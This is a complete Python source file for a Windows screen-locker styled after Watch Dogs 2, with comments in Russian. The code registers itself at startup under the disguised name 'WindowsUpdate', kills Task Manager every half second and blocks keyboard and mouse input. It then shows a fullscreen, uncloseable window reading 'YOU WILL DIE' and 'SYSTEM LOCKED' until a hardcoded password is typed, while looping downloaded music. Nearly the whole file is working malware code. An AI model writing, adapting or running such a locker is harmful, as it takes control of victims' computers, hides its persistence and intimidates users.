import ctypes, os, sys, time, threading, random, tempfile, urllib.request

# === НАСТРОЙКИ ===
PASSWORD = "1601"
TIMER_SECONDS = 15  # для теста, потом 600
MUSIC_URL = "https://ost-watch-dogs-2.skysound7.com/t/06067162842068930321-ost-watch-dogs-2-main-menu-theme/"
MUSIC_FILE = os.path.join(tempfile.gettempdir(), "wd2_theme.mp3")

# === 1. СКАЧИВАЕМ МУЗЫКУ ОДИН РАЗ В TEMP ===
def download_music():
    if not os.path.exists(MUSIC_FILE):
        try:
            urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
        except:
            pass

# === 2. ПРОИГРЫВАЕМ МУЗЫКУ ФОНОМ (без браузера) ===
def play_music():
    try:
        import pygame.mixer as mixer
        mixer.init()
        mixer.music.load(MUSIC_FILE)
        mixer.music.play(-1)  # зациклено
    except:
        pass

# === 3. БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
def block_input(block=True):
    ctypes.windll.user32.BlockInput(block)

# === 4. УБИВАЕМ ДИСПЕТЧЕР ЗАДАЧ КАЖДЫЕ 500 МС ===
def kill_taskmgr():
    while True:
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        time.sleep(0.5)

# === 5. ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ ===
def add_to_startup():
    import winreg
    key = winreg.HKEY_CURRENT_USER
    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable + ' "' + os.path.abspath(__file__) + '"')
        winreg.CloseKey(reg)
    except:
        pass

# === 6. АНИМАЦИЯ ЗАГРУЗКИ (0% → 100%) ===
def show_boot_animation():
    import tkinter as tk
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    lbl = tk.Label(root, text="", fg='#0f0', bg='black', font=('Courier', 36, 'bold'))
    lbl.pack(expand=True)
    bar = tk.Canvas(root, width=600, height=30, bg='black', highlightthickness=0)
    bar.pack(pady=20)
    for i in range(0, 101, 5):
        lbl.config(text=f"ВЗЛОМ ctOS 2.0: {i}%")
        bar.delete("progress")
        bar.create_rectangle(10, 5, 10 + (i * 5.8), 25, fill='#0f0', tags="progress")
        root.update()
        time.sleep(0.15)
    time.sleep(0.5)
    root.destroy()

# === 7. ГЛАВНОЕ ОКНО БЛОКИРОВКИ ===
class WinLocker:
    def __init__(self):
        self.root = tk.Tk()
        self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True)
        self.win.attributes('-topmost', True)
        self.win.configure(bg='black')
        self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        
        self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        # Страшные надписи
        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='red', font=('Courier', 60, 'bold'))
        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='red', font=('Courier', 36))
        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='red', font=('Courier', 28))
        
        # Поле ввода
        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='red', insertbackground='red')
        self.canvas.create_window(400, 360, window=self.entry)
        self.status = self.canvas.create_text(400, 420, text="", fill='red', font=('Courier', 20))
        
        self.entry.bind('<Return>', self.check_password)
        self.entry.focus_set()
        
        # Запускаем анимацию черепа
        self.animate()
    
    def check_password(self, event=None):
        if self.entry.get() == PASSWORD:
            block_input(False)
            self.root.destroy()
            os._exit(0)
        else:
            self.canvas.itemconfig(self.status, text="НЕВЕРНЫЙ ПАРОЛЬ!")
            self.entry.delete(0, tk.END)
    
    def animate(self):
        self.canvas.delete("skull")
        self.canvas.delete("particle")
        # ASCII череп
        lines = [
            "      .-\"-.\"",
            "     /|6 6|\\",
            "    {/(_0_)\\}",
            "     _/ ^ \\_",
            "    (/ /^\\ \\)-'",
            "     \"\"' '\"\""
        ]
        y = 480
        for line in lines:
            self.canvas.create_text(400, y, text=line, fill='red', font=('Courier', 16), tags="skull")
            y += 22
        # Частицы
        for _ in range(30):
            x = random.randint(0, 800)
            y = random.randint(0, 600)
            s = random.randint(2, 5)
            self.canvas.create_oval(x, y, x+s, y+s, fill='red', outline='red', tags="particle")
        self.win.after(50, self.animate)

# === 8. ЗАПУСК ===
if __name__ == "__main__":
    import tkinter as tk
    download_music()
    add_to_startup()
    threading.Thread(target=kill_taskmgr, daemon=True).start()
    time.sleep(TIMER_SECONDS)
    block_input(True)
    threading.Thread(target=play_music, daemon=True).start()
    show_boot_animation()
    app = WinLocker()
    app.root.mainloop()
